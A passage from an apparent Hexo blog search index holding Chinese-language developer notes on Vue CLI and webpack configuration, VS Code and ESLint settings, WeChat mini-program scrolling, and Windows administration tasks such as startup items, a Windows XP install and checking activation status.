<h2 id="2019-年-3-月-8-日更新"><a href="#2019-年-3-月-8-日更新" class="headerlink" title="2019 年 3 月 8 日更新"></a>2019 年 3 月 8 日更新</h2><p>由于项目几乎都不会放在根目录下，而且项目都需要使用 history 模式，故无法在基础路径中使用相对路径，因此应该尽量约定好项目在服务器上的目录名，并在基础路径上以绝对路径方式配置。注意，vue-cli 3.3 版本后使用 publicPath 替代了原来 vue.config.js 中 baseUrl 的配置。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  publicPath<span class="token operator">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">NODE_ENV</span> <span class="token operator">===</span> <span class="token string">'production'</span>
    <span class="token operator">?</span> <span class="token string">'/production-sub-path/'</span>
    <span class="token operator">:</span> <span class="token string">'/'</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
        <tag>生产环境</tag>
        <tag>相对路径</tag>
      </tags>
  </entry>
  <entry>
    <title>vscode用户配置与vue项目通用配置</title>
    <url>/2018/10/20/vscode%E7%94%A8%E6%88%B7%E9%85%8D%E7%BD%AE%E4%B8%8Evue%E9%A1%B9%E7%9B%AE%E9%80%9A%E7%94%A8%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="用户文件配置"><a href="#用户文件配置" class="headerlink" title="用户文件配置"></a>用户文件配置</h2><pre class="line-numbers language-JSON" data-language="JSON"><code class="language-JSON">&#123;
    &#x2F;&#x2F; 设置编辑器的tabSize为2
    &quot;editor.tabSize&quot;: 2,
    &#x2F;&#x2F; 关闭基于文件自动检测tabSize与insertSpaces
    &quot;editor.detectIndentation&quot;: false,
    &#x2F;&#x2F; 使用prettier格式化vue中的html
    &quot;vetur.format.defaultFormatter.html&quot;: &quot;prettier&quot;,
    &#x2F;&#x2F; 不使用vetur的简化版eslint-plugin-vue检查template中的html，因为会报x-invalid-end-tag
    &quot;vetur.validation.template&quot;: false,
    &#x2F;&#x2F; 文件路径改变后自动更新import
    &quot;typescript.updateImportsOnFileMove.enabled&quot;: &quot;always&quot;,
    &quot;javascript.updateImportsOnFileMove.enabled&quot;: &quot;always&quot;,
    &#x2F;&#x2F; 防止api-extractor init出的json文件中有注释而报错
    &quot;files.associations&quot;: &#123;
      &quot;*.json&quot;: &quot;jsonc&quot;
    &#125;,
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="ESlint-的-rules-文件配置"><a href="#ESlint-的-rules-文件配置" class="headerlink" title="ESlint 的 rules 文件配置"></a>ESlint 的 rules 文件配置</h2><p>使用配置前确保项目中使用 npm 安装了 eslint，eslint-plugin-vue 等包，以及 vetur，prettier 等 vscode 插件，现在 3.3 版本的 vue cli 已安装 eslint-plugin-vue。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  root<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
  env<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    node<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token keyword">extends</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"plugin:vue/essential"</span><span class="token punctuation">,</span> <span class="token string">"@vue/prettier"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  rules<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"no-console"</span><span class="token operator">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">NODE_ENV</span> <span class="token operator">===</span> <span class="token string">"production"</span> <span class="token operator">?</span> <span class="token string">"error"</span> <span class="token operator">:</span> <span class="token string">"off"</span><span class="token punctuation">,</span>
    <span class="token string">"no-debugger"</span><span class="token operator">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">NODE_ENV</span> <span class="token operator">===</span> <span class="token string">"production"</span> <span class="token operator">?</span> <span class="token string">"error"</span> <span class="token operator">:</span> <span class="token string">"off"</span><span class="token punctuation">,</span>
    <span class="token comment">// 不检查iview等UI框架的“x-invalid-end-tag”错误，使用vetur简化版禁用不全，应安装eslint-plugin-vue</span>
    <span class="token string">"vue/no-parsing-error"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token number">2</span><span class="token punctuation">,</span>
      <span class="token punctuation">&#123;</span>
        <span class="token string">"x-invalid-end-tag"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token comment">/* // 现已使用两个空格缩进，下面4空格设置废弃
        // 对vue文件中的html缩进检查设置为4
        "vue/html-indent": [
            "error",
            4,
            &#123;
                "attribute": 1,
                "closeBracket": 0,
                "alignAttributesVertically": true,
                "ignores": []
            &#125;
        ],
        // 将prettier的缩进检查设置为4
        "prettier/prettier": [
            "error",
            &#123;
                tabWidth: 4
            &#125;
        ] */</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  parserOptions<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    parser<span class="token operator">:</span> <span class="token string">"babel-eslint"</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>默认已经安装 vetur 插件</p>
]]></content>
      <categories>
        <category>vscode</category>
      </categories>
      <tags>
        <tag>vscode vue iview</tag>
      </tags>
  </entry>
  <entry>
    <title>vue如何让第三方包兼容IE</title>
    <url>/2019/03/08/vue%E5%A6%82%E4%BD%95%E8%AE%A9%E7%AC%AC%E4%B8%89%E6%96%B9%E5%8C%85%E5%85%BC%E5%AE%B9IE/</url>
    <content><![CDATA[<h1 id="vue如何让第三方包兼容IE"><a href="#vue如何让第三方包兼容IE" class="headerlink" title="vue如何让第三方包兼容IE"></a>vue如何让第三方包兼容IE</h1><p>我们在使用vue的过程中会发现安装了第三方包，却无法在IE浏览器下正常运行的情况，这是因为vue-cli为了打包速度，默认情况下是不会使用babel-loader去处理node_modules下的第三方包的，这里有三种解决方案：</p>
<h2 id="1-将第三方包移出node-modules文件夹"><a href="#1-将第三方包移出node-modules文件夹" class="headerlink" title="1. 将第三方包移出node_modules文件夹"></a>1. 将第三方包移出node_modules文件夹</h2><p>将包从node_modules中拷贝出来，放入components文件夹下，再将import包的路径改为components下的路径，这样就可以在自己的项目中使用babel-loader去编译第三方的包了，但是这样做很不优雅。</p>
<h2 id="2-在vue-config-js中配置webpack使babel-loader去编译node-modules中的包"><a href="#2-在vue-config-js中配置webpack使babel-loader去编译node-modules中的包" class="headerlink" title="2. 在vue.config.js中配置webpack使babel-loader去编译node_modules中的包"></a>2. 在vue.config.js中配置webpack使babel-loader去编译node_modules中的包</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  configureWebpack<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    module<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      rules<span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">&#123;</span>
          test<span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.js$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span>
          exclude<span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\/node_modules\/tree-table-vue\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span>
          use<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            loader<span class="token operator">:</span> <span class="token string">"babel-loader"</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">]</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里有个疑问一直没搞明白，exclude 是排除的意思，webpack官方文档也是这样解释的，但是这个文件默认就是排除掉的，按照官方文档，应该使用include包含这个路径，但是使用include却无效，而使用exclude是有效的。</p>
<h2 id="3-终级解决方案，vue-cli的配置项transpileDependencies"><a href="#3-终级解决方案，vue-cli的配置项transpileDependencies" class="headerlink" title="3. 终级解决方案，vue-cli的配置项transpileDependencies"></a>3. 终级解决方案，vue-cli的配置项transpileDependencies</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  transpileDependencies<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"tree-table-vue"</span><span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>node_modules</tag>
        <tag>兼容IE</tag>
      </tags>
  </entry>
  <entry>
    <title>vue监听对象内的属性</title>
    <url>/2019/02/11/vue%E7%9B%91%E5%90%AC%E5%AF%B9%E8%B1%A1%E5%86%85%E7%9A%84%E5%B1%9E%E6%80%A7/</url>
    <content><![CDATA[<h1 id="监听对象内的属性"><a href="#监听对象内的属性" class="headerlink" title="监听对象内的属性"></a>监听对象内的属性</h1><p>通过vue的官方文档我们知道watch函数可以监听data中的各种变量，但若要监听的变量是一个对象中的某个属性，就很难做到了。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>
        normalVar<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        myObject<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            myKey<span class="token operator">:</span> myValue
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
<span class="token function">watch</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 这是对普通对象的监听，要监听myObject中的myKey就无法直接用watch做到了</span>
    <span class="token function">normalVar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'normalVar changed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>那么我们如何监听到myObject中的myKey变化呢？这里就要用到computed属性做为中间层了，通过computed做为中间层就可以完美监听到myObject中myKey的变化了。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>
        myObject<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            myKey<span class="token operator">:</span> myValue
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
<span class="token function">computed</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">computeMyKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>myObject<span class="token punctuation">.</span>myKey
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
<span class="token function">watch</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">computeMyKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'myKey changed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
        <tag>监听对象属性</tag>
      </tags>
  </entry>
  <entry>
    <title>vue如何在打生产环境包时去除console信息</title>
    <url>/2019/03/24/vue%E5%A6%82%E4%BD%95%E5%9C%A8%E6%89%93%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E5%8C%85%E6%97%B6%E5%8E%BB%E9%99%A4console%E4%BF%A1%E6%81%AF/</url>
    <content><![CDATA[<h1 id="如何在打生产环境包时去除console信息"><a href="#如何在打生产环境包时去除console信息" class="headerlink" title="如何在打生产环境包时去除console信息"></a>如何在打生产环境包时去除console信息</h1><h2 id="方法一、修改node-modules中的-vue包下关于terserOptions的配置"><a href="#方法一、修改node-modules中的-vue包下关于terserOptions的配置" class="headerlink" title="方法一、修改node_modules中的@vue包下关于terserOptions的配置"></a>方法一、修改node_modules中的@vue包下关于terserOptions的配置</h2><p>配置路径为node_modules/@vue/cli-service/lib/config/terserOptions.js</p>
<p>在compress对象中加上 drop_console: true 即可在打生产环境包时去除所有的 console。若不想删除所有的console信息，只是想删除console.log，则配置compress对象中的 pure_funcs 字段为 [“console.log”]。</p>
<h2 id="方法二、在vue-config-js中直接修改webpack配置"><a href="#方法二、在vue-config-js中直接修改webpack配置" class="headerlink" title="方法二、在vue.config.js中直接修改webpack配置"></a>方法二、在vue.config.js中直接修改webpack配置</h2><p>既然核心方法是在webpack打包时利用terser插件实现去除console的效果，那么直接在vue.config.js中配置webpack即可</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 引入terser插件</span>
<span class="token keyword">const</span> TerserPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"terser-webpack-plugin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 使用configureWebpack字段配置webpack</span>
module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// 下面两种配置方式选一即可</span>
  <span class="token comment">// 一、配置式</span>
  configureWebpack<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    optimization<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      minimizer<span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token keyword">new</span> <span class="token class-name">TerserPlugin</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
          terserOptions<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            compress<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
              pure_funcs<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"console.log"</span><span class="token punctuation">]</span>
            <span class="token punctuation">&#125;</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
      <span class="token punctuation">]</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token comment">// 二、链式操作</span>
  <span class="token function-variable function">chainWebpack</span><span class="token operator">:</span> <span class="token parameter">config</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    config<span class="token punctuation">.</span>optimization<span class="token punctuation">.</span><span class="token function">minimizer</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">TerserPlugin</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
      terserOptions<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
        compress<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
          pure_funcs<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"console.log"</span><span class="token punctuation">]</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
        <tag>去除console</tag>
      </tags>
  </entry>
  <entry>
    <title>webpack开发库后使用npm的link命令测试时import失败</title>
    <url>/2021/06/04/webpack%E5%BC%80%E5%8F%91%E5%BA%93%E5%90%8E%E4%BD%BF%E7%94%A8npm%E7%9A%84link%E5%91%BD%E4%BB%A4%E6%B5%8B%E8%AF%95%E6%97%B6import%E5%A4%B1%E8%B4%A5/</url>
    <content><![CDATA[<h2 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h2><p>使用 webpack 开发一个库后，想在未发布的条件下，对库进行测试，通常会使用<code>npm link</code>命令，该命令会将当前目录链接至用户文件夹下的 npm 包公用目录，在要引入包进行测试的项目中再使用<code>npm link 你已经链接至公用目录的包名</code>，就可以将库从公用目录再链接到测试的项目中，这就等同于使用 npm 直接安装包了。但是使用中发现还是有问题，使用<code>npm link</code>引入的包，在项目中 import 后会报错，但是同样的文件发布到 npm 后再 import 就没有问题。</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>在测试项目中将 webpack 的符号链接配置为 false 即可，即可正确 import 要测试的库了</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// webpack配置</span>
module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// ...</span>
  resolve<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    symlinks<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<span id="more"></span>

<h2 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h2><h3 id="symlinks-的作用"><a href="#symlinks-的作用" class="headerlink" title="symlinks 的作用"></a>symlinks 的作用</h3><p>symlinks 表示是否将符号链接解析到它们的原始位置，symlinks 默认配置为 true，即相当于默认情况下，符号链接的资源（通过 npm link 引入的开发的库）解析为真实路径（开发的库的真实路径），而不是符号链接的位置（测试项目中的 node_modules 路径）。</p>
<h3 id="webpack-的打包机制"><a href="#webpack-的打包机制" class="headerlink" title="webpack 的打包机制"></a>webpack 的打包机制</h3><p>还记得你在配置库的 webpack 时，打包输出设置了什么吗？为了方便 CommonJS 和 AMD 方式引入，我们通常都会把<code>output.library.type</code>配置为<code>umd</code>，那么我们在项目中使用的时候却是使用 esm 的方式 import 的，为什么明明导出了 umd 却可以在项目中以 esm 的方式使用呢？</p>
<p>原来 webpack 会将 node_modules 下的所有文件事先经过一次编译，使 umd 形式的包符合 esm 的引用方式，而 webpack 默认<code>resolve.symlinks</code>配置为<code>true</code>，从库的真实路径去解析包了，并不是从项目的 node_modules 目录下去解析包的，因此 umd 形式的包未经过 webpack 编译为 esm 可引入的形式，故而会发生报错。这也是为什么经过 npm 发布后，同样的包就可以正确使用，而 npm link 却不行的原因。</p>
<p>P.S. webpack 对 esm 的支持还是试验性，需要进行额外的配置才能开启。</p>
<blockquote>
<p>参考资料</p>
<p><a href="https://www.jianshu.com/p/ca252cd667df">记一次错：Vue 构建项目后使用 npm link 失败</a></p>
<p><a href="https://webpack.docschina.org/configuration/resolve/#resolvesymlinks">webpack 官方配置文档 resolve-symlinks</a></p>
</blockquote>
]]></content>
      <categories>
        <category>webpack</category>
      </categories>
      <tags>
        <tag>npm</tag>
        <tag>webpack</tag>
        <tag>库开发</tag>
      </tags>
  </entry>
  <entry>
    <title>windows10管理启动项</title>
    <url>/2020/01/20/windows10%E7%AE%A1%E7%90%86%E5%90%AF%E5%8A%A8%E9%A1%B9/</url>
    <content><![CDATA[<h2 id="管理启动项"><a href="#管理启动项" class="headerlink" title="管理启动项"></a>管理启动项</h2><p>若是通过正常的安装程序安装的软件并且可以设置为开机启动的，可以在 windows10 的设置——应用——启动中找到并设置开关。</p>
<h2 id="新增启动项"><a href="#新增启动项" class="headerlink" title="新增启动项"></a>新增启动项</h2><p>若是在设置中无法设置开机启动的，则可以将应用程序的快捷方式放在启动文件夹下，启动文件夹路径为 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp，即可将该应用程序设置为开机启动。</p>
<p>注意：系统语言为中文时，启动文件夹路径不变，但可能显示为中文名称。</p>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
  </entry>
  <entry>
    <title>windowsXP纯净安装（无PE）</title>
    <url>/2018/06/01/windowsXP%E7%BA%AF%E5%87%80%E5%AE%89%E8%A3%85(%E6%97%A0PE)/</url>
    <content><![CDATA[<h1 id="winXP无法直接用u盘直接安装"><a href="#winXP无法直接用u盘直接安装" class="headerlink" title="winXP无法直接用u盘直接安装"></a>winXP无法直接用u盘直接安装</h1><p>win7及以后的系统都可以直接用ultraiso在U盘中写入微软原版硬盘映像，然后引导安装微软纯净系统，但winXP用这个办法安装却会报错，无法进入安装环境。因此winXP时代重装系统多是利用第三方PE（预安装环境）和ghost，这虽然方便但是会发生第三方篡改系统的问题。这里我就说说如何用win7及以上安装U盘来装winXP。</p>
<p>原理：利用win7的预安装环境来运行winXP安装文件</p>
<p>准备材料：2个U盘，ultraiso，winXP.iso，win7.iso or win10.iso（用于当启动盘）</p>
<span id="more"></span>
<ol>
<li>将win7.iso用ultraiso写入硬盘映像装入U盘1；</li>
<li>将winXP.iso解压入U盘2；</li>
<li>将U盘1与U盘2接到目标计算机，从U盘1启动，进入win7安装环境；</li>
<li>使用win7安装环境做好硬盘分区和格式化（也可进入diskpart后用diskpart在命令行格式化）；</li>
<li>按下shift+F10打开命令行，输入diskpart回车，进入diskpart分区工具；</li>
<li>输入list volume，回车查看U盘2的盘符与安装winXP的目标盘符，例如U盘1是X盘，U盘2是F盘，目标硬盘是C盘；（本来原理上是可以在命令行中直接运行F盘里xp的SETUP.EXE，但是由于win7预安装环境是比XP更先进的系统，兼容性检查不允许安装低版本系统，直接运行SETUP.EXE会发现安装选项是灰色，因此要按下面步骤操作）</li>
<li>输入exit退出diskpart，回到cmd，输入F：进入F盘；</li>
<li>复制U盘2中的所有文件到硬盘的另一个分区D，输入xcopy .\ D:\ /s /e （.\代表当前工作目录，D:\代表目标目录，/s参数代表复制所有目录和文件夹，/e参数代表复制包括空文件夹），若不执行此步，有的电脑安装时会出现asms.01.cab找不到的问题；</li>
<li>输入cd i386(64位系统为cd amd64)，进入i386（amd64）文件夹，输入winnt32.exe /syspart:C /tempdrive:C /makelocalsource（syspart参数指定安装的系统盘，tempdrive参数指定安装文件临时盘，如不指定会安装到当前的U盘1即X盘，导致无法安装，makelocalsource将winXP安装包拷备到计算机，以后安装功能不用再装入安装光盘）；</li>
<li>这时会跳出xp安装界面，复制安装文件，复制完后就自动退出了；</li>
<li>退出win7安装环境，重启电脑从硬盘启动就开始安装winXP了。</li>
</ol>
<p>如果看到这你成功了，说明你还是挺厉害的。但是</p>
<p>** 前方高能预警 **</p>
<hr>
<p>前面的教程都是bull shit，主要是ultraiso对xp支持不好，导致不能进入安装环境。我们换一款名为<a href="https://rufus.akeo.ie/">rufus</a>软件再来将映像写入U盘，发现一切就像直接用win7映像安装系统一样简单。（rufus不支持win xp 64位）</p>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
  </entry>
  <entry>
    <title>windows查看激活状态</title>
    <url>/2018/06/01/windows%E6%9F%A5%E7%9C%8B%E6%BF%80%E6%B4%BB%E7%8A%B6%E6%80%81/</url>
    <content><![CDATA[<h2 id="winXP-查看激活状态"><a href="#winXP-查看激活状态" class="headerlink" title="winXP 查看激活状态"></a>winXP 查看激活状态</h2><p>win+R 打开运行对话框，输入 oobe/msoobe /a 查看是否激活</p>
<h2 id="win7-及以上系统查看激活状态"><a href="#win7-及以上系统查看激活状态" class="headerlink" title="win7 及以上系统查看激活状态"></a>win7 及以上系统查看激活状态</h2><p>win+R 打开运行对话框，输入</p>
<p>slmgr.vbs -dlv 查看完整授权状态，</p>
<p>slmgr.vbs -dli 查看简化授权状态，</p>
<p>slmgr.vbs -xpr 查看是否永久激活。</p>
<span id="more"></span>

<h2 id="office-查看激活状态与管理密钥"><a href="#office-查看激活状态与管理密钥" class="headerlink" title="office 查看激活状态与管理密钥"></a>office 查看激活状态与管理密钥</h2><p>win+R 运行 cmd，键入 cd C:\Program Files\Microsoft Office\Office1X 进入 office 目录（不同版本 Office，X 数字不同，安装位置可能也不同）。</p>
<p>输入 cscript ospp.vbs /dstatus 查看密钥详细信息，</p>
<p>cscript ospp.vbs /unpkey:XXXXX 删除密钥（XXXXX 为详细信息中查到的密钥后五位），</p>
<p>添加密钥 cscript ospp.vbs /inpkey:XXXXX-XXXXX-XXXXX-XXXXX-XXXXX。</p>
<p>还有其他 ospp.vbs 命令可自行上网查找。</p>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
  </entry>
  <entry>
    <title>微信小程序scroll-view与windowHeight</title>
    <url>/2018/10/21/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8Fscroll-view%E4%B8%8EwindowHeight/</url>
    <content><![CDATA[<h1 id="微信小程序中实现菜单栏上滑至顶后，固定位置"><a href="#微信小程序中实现菜单栏上滑至顶后，固定位置" class="headerlink" title="微信小程序中实现菜单栏上滑至顶后，固定位置"></a>微信小程序中实现菜单栏上滑至顶后，固定位置</h1><ol>
<li><p>小程序中只能使用scroll-view组件监听页面滚动离顶部的距离，scroll-view的滑动会与page页面的滑动相叠加。因此需要设置scroll-view组件的宽高分别为可用窗口的实际高度。 不应该在程序加载时通过接口getSystemInfo获取可用窗口高度windowHeight，因为此时的窗口是不包含底部tabbar高度的窗口，而跳转后的页面无tabbar，高度包含了tabbar高度，因此要在跳转后的页面onReady生命周期函数中使用getSystemInfo获取windowHeight。</p>
</li>
<li><p>在scroll-view中监听离顶部的距离，应该避免实时赋值操作，因为setData函数与监听函数都很消耗性能，应在监听函数中做完判断再进行赋值，否则会造成真机预览时滑动卡顿的状况。</p>
</li>
<li><p>由于使用了flex布局当菜单栏吸顶变为绝对定位时，应该用一个和菜单栏相同大小的空view组件填补菜单栏的位置，否则会发生下面布局整体上移的现象。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>微信小程序</category>
      </categories>
      <tags>
        <tag>微信小程序</tag>
        <tag>scroll-view</tag>
        <tag>windowHeight</tag>
      </tags>
  </entry>
  <entry>
    <title>vue递归组件props的双向绑定</title>
    <url>/2019/07/11/vue%E9%80%92%E5%BD%92%E7%BB%84%E4%BB%B6props%E7%9A%84%E5%8F%8C%E5%90%91%E7%BB%91%E5%AE%9A/</url>
    <content><![CDATA[<h2 id="自定义组件-prop-的双向绑定"><a href="#自定义组件-prop-的双向绑定" class="headerlink" title="自定义组件 prop 的双向绑定"></a>自定义组件 prop 的双向绑定</h2><p>在 vue 中当我们要用到双向绑定的时候，第一反应是使用 v-model 属性，但 v-model 属性只能用在部分表单相关的组件上，如 input、select、textarea。如果我们在自定义的组件传递的 prop 上也想达到双向绑定的效果该如何做呢？答案是使用<a href="https://cn.vuejs.org/v2/guide/components-custom-events.html#sync-%E4%BF%AE%E9%A5%B0%E7%AC%A6">.sync 修饰符</a>。</p>
<p>.sync 修饰符实质上是 v-bind 与 update 事件的语法糖，我们通过在子组件内给父组件传递事件来更新父组件传给子组件的 prop，以实现双向绑定。</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 在父组件内 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span>
